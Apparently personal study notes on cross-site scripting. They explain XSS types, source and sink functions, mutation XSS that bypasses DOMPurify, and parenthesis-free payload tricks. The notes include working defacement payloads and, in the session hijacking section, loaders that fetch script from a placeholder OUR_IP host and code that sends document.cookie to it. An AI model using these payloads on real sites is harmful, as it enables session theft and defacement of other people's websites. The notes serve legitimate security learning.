As XSS attacks execute JavaScript code within the browser, they are limited to the browser's JS engine (i.e., V8 in Chrome).


|Type 	     |       Description |
|--------------|---------------|
Stored (Persistent) XSS 	   |      occurs when user input is stored on the back-end database and then displayed upon retrieval 
Reflected (Non-Persistent) XSS 	|    Occurs when user input is displayed on the page after being processed by the backend server
DOM-based XSS 	            |   occurs when user input is directly shown in the browser and is completely processed on the client-side , and embeded in the DOM.


# Stored XSS (P3rsistent)

If our injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.

`<script>alert(window.origin)</script>`


    Tip: Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we pop window.origin in the alert box.


# Reflected XSS


Reflected XSS vulnerabilities occur when our input reaches the back-end server and gets returned to us without being filtered or sanitized. There are many cases in which our entire input might get returned to us, like error messages or confirmation messages. In these cases, we may attempt using XSS payloads to see whether they execute. However, as these are usually temporary messages, once we move from the page, they would not execute again, and hence they are Non-Persistent.



# DOM XSS


While reflected XSS sends the input data to the back-end server through HTTP requests, **DOM XSS is completely processed on the client-side through JavaScript. DOM XSS occurs when JavaScript is used to change the page source through the Document Object Model (DOM).**




## Source & Sink

The **Source** is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field, as we saw above.

The **Sink** is the function that writes the user input to a DOM Object on the page. Some of the commonly used JavaScript functions to write to DOM objects are:

- document.write()
- DOM.innerHTML
- DOM.outerHTML

Some of the **jQuery** library functions that write to DOM objects are:

- add()
- after()
- append()

        

    ! innerHTML function does not allow the use of the `<script>` tags within it as a security feature.

    `<img src="" onerror=alert(window.origin)>`


# Discovery

- Automated 

Almost all Web Application Vulnerability Scanners (like Nessus, Burp Pro, or ZAP) have various capabilities for detecting all three types of XSS vulnerabilities.


#### XXStrike
```
$ git clone https://github.com/s0md3v/XSStrike.git

$ cd XSStrike

$ pip install -r requirements.txt

$ python xsstrike.py

$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```


- Manual Discovery

We can find huge lists of XSS payloads online, like the one on [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) or the one in [PayloadBox]().

    Note: You may XSS  in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).




# Defacing

Defacing a website means changing its look for anyone who visits the website. 


### Defacement Elements

Four HTML elements are usually utilized to change the main look of a web page:

- Background Color document.body.style.background
- Background document.body.background
- Page Title document.title
- Page Text DOM.innerHTML


### Changing Background

`<script>document.body.style.background = "#141d2b"</script>`


        ! This will be persistent through page refreshes and will appear for anyone who visits the page, as we are utilizing a stored XSS vulnerability.


OR set an image to the background using the following payload

`<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`


### Changing Page Title

`<script>document.title = 'HackTheBox Academy'</script>`



### Changing Page Text

`document.getElementById("todo").innerHTML = "New Text"`

We can also utilize jQuery functions for more efficiently achieving the same thing or for changing the text of multiple elements in one line (to do so, the jQuery library must have been imported within the page source):

`$("#todo").html('New Text');`

change the entire HTML code of the main body, using innerHTML, as follows:

`document.getElementsByTagName('body')[0].innerHTML = "New Text"`



# Session Hijacking


### Blind XSS Detection

```
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

### Exploit 

Host a file.js like:

```
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```


and inject the payload

```
<script src=http://OUR_IP/script.js></script>
```





# Mutation XSS
[cure53's_paper](https://cure53.de/fp170.pdf)
### Purpose 

The purpose of this technique is to bypass famous sanitizing libraries such as DOMPurify and execute JS code
client side , in the form of cross site scriptng.

### Why mXSS exists

Mutation XSS exists primarely because HTML Parsers are fault tolerant in a way that they permit developers
to make 'mistakes' in their code but the parsers 'fix' them in order to keep internet running.
Also , sanitizing software and their developers usually assume that their parsing libraries and the way
browsers parse the HTML-like text into the DOM-tree stucture , is always the same.Thats not always true


### Example : Bypassing DOMPurify

[securitumBlog](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)

```div.innerHTML = DOMPurify.sanitize(htmltext)```

In the above line of code , execution follows these steps:

1. sanitize() first passes html text into an `<element>` tag and parses the tokenised string into DOM.

2. DOMPurify sanitizes the DOM Tree, deleting all nodes that are not in the allow-list.

3. The DOM tree is serialized back into the HTML text.

4. innerHTML does the same thing with step no1 as it expects a html like string as input.

5. the parsed DOM Tree is appended to the DOM of the document.


Developers assume that steps number 1 and 4 are going to produce the same result but Thats
not always true.

[html.spec](https://html.spec.whatwg.org/multipage/parsing.html#serialising-html-fragments)


this specification gives an example .

`<form id="outer"><div></form><form id="inner"><input>`

this code converts to this DOM Tree

```
   <form id="outer">
   |
    ---> <div>
       |
        ---> <form id="inner">
           |
            ----> <input/>
```


- When you open a `<form>` tag, the parser needs to keep record of the fact that it was opened with a form element pointer . If the pointer is not null, then form element cannot be created.
- When you end a `<form>` tag, the form element pointer is always set to null. 
- So by setting the `</form>` and closing the first form after 
the `<div>` tag , pointer is set to null.

- ! The input element will be associated with the inner form element.

Following step 3 and serializing the DOM Tree produces this string

`<form id="outer"><div><form id="inner"><input></form></div></form>`

DOM Tree now looks like this :

```
   <form id="outer">
   |
    ---> <div>
       |
        ---> <input/>
           
```

- !  the input element will be associated with the outer form element instead.

#### Foreign Content 


HTML Documents and parsers have three name spaces:

-    [HTML namespace](http://www.w3.org/1999/xhtml)
-    [SVG namespace](http://www.w3.org/2000/svg)
-    [MathML namespace](http://www.w3.org/1998/Math/MathML)

besides html namespace, the other two specify the foreign namespace.


Elements in foreign Content behave differently.

MathML and  HTML Integration points are elements that when declared 
in the Tree, HTML namespace is switched back for their child elements from
MATHML and SVG namespaces respectively.

- MathML text integration points are:

    - math mi
    - math mo
    - math mn
    - math ms
    - math mtext

- HTML integration points are:

    - math annotation-xml if it has an attribute called encoding whose value is equal to either text/html or application/xhtml+xml
    - svg foreignObject
    - svg desc
    - svg title

These are the Rules governing this behaviour:


1. If current element is `<svg>` or `<math>` and parent is in HTML namespace, then current element is in SVG or MathML namespace respectively.
2. Current element is in the namespace of its parent unless:
3. If parent of current element is an HTML integration point, then current element is in HTML namespace unless it’s `<svg>` or `<math>`
4. If parent of current element is an MathML integration point, then current element is in HTML namespace unless it’s `<svg>`, `<math>`, `<mglyph>` or `<malignmark>`



So the payload 

`<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`

produces :

```
   <(html) form >
   |
    ---> <(MathML) math>
       |
        ---> <(MathML) mtext>
           |
            ----> <(html) form>
                |
                 ----> <(html) mglyph>
                     |
                      ----> <(html) style>
                           |
                            ----> #text : "</math><img src onerror=alert(1)>"
                       
```


After serializing the string in step 3 is:

`<form><math><mtext><form><mglyph><style></math><img src onerror=alert(1)></style></mglyph></form></mtext></math></form>`


Nested `<form>` is ommited when passed in innerHTML so the DOMTree becomes:

```
   <(html) form >
   |
    ---> <(MathML) math>
       |
        ---> <(MathML) mtext>
           |
            ----> <(MathML) mglyph>
                |
                 ----> <(MathML) style>
                     |
                      ----> <(math) style>
                           |
    <(html) img src onerror=alert(1)>"      
```

Check also [Portswigger](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)
[mizu_blog](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes) with  a lot of resources!





# Tips n Tricks

## No Parenthesis or semicolon

[portswigger](https://portswigger.net/research/xss-without-parentheses-and-semi-colons)
[explanation article](https://blog.huli.tw/2025/09/15/en/xss-without-semicolon-and-parentheses/)

`<script>onerror=alert;throw 1</script>`


`<script>{onerror=alert}throw 1</script>`

`<script>throw onerror=alert,1</script>`

`<script>{onerror=eval}throw'=alert\x281337\x29'</script>`


- throw accepts statements as atributes
- it peaks the last expression to throw in error handler
- You cant `<script>onerror=alert, throw 1</script>` as throw is a statement , not an expression. So this will produce an error.
- You can use code blocks to isolate one part from another



#### Firefox payloads

```
onerror=alert;
throw 1;
// uncaught exception: 1
```

- You neeed to manipulate the uncaught exception string


```
onerror=alert;
throw new Error(1);
// Error: 1
```


- Error() produces a cleaner error string but uses parentesis
- You can throw an object with the apropriate properties 

```
<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>
```

You can use the fileName property to send a second argument on Firefox too:

```
<script>{onerror=prompt}throw{lineNumber:1,columnNumber:1,fileName:'second argument',message:'first argument'}</script>
```



## Tagged template strings


Template strings in the form of :

```
`Hello ${name}`
```

can be prepended with a function and become Tagged leterals:

```
console.log`Hello ${name}`
```

When calling a function with a template string syntax , parameters are passed to the funxtion as follows:

for the string `My ${attribute} is ${atr_name} !` the function is called with

-First parameter is an array of all strings separated by placeholders, in this example is ['My', 'is', '!']

- placeholders like attribute and atr_name, are passed as single paramateres after.

For example:

```
const attribute = 'colour'
const atr_name = 'blue' 
function func(...args){
    console.log(args)
}

func`My ${attribute} is ${atr_name} !`
//[ ['My', 'is', '!'], 'colour' , 'blue' ]
```

#### Usage 1 


you dynamically generate functions that execute with that method with [Function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function)

`new Function(arg1, arg2, /* …, */ argN, functionBody)`

- `new` can be ommited

- the `functionBody` (last parameter) is the actual executed code

- is equivelant to ```function anonymous(${args.join(",")}
) {
${functionBody}
}`;```

- so for example ```Function`alert(1)` ``` => ```anonymous() { alert(1) }```

- Since you operate inside strings you can also use unicode/hex characters

- to imediatelly call the function you can use `` again with a space or not

``` Function`alert\x281337\x29` ``  ```
``` Function`alert\u00281\u0029` `` ```

``` Function`_${location.hash.slice`1`}` `` ```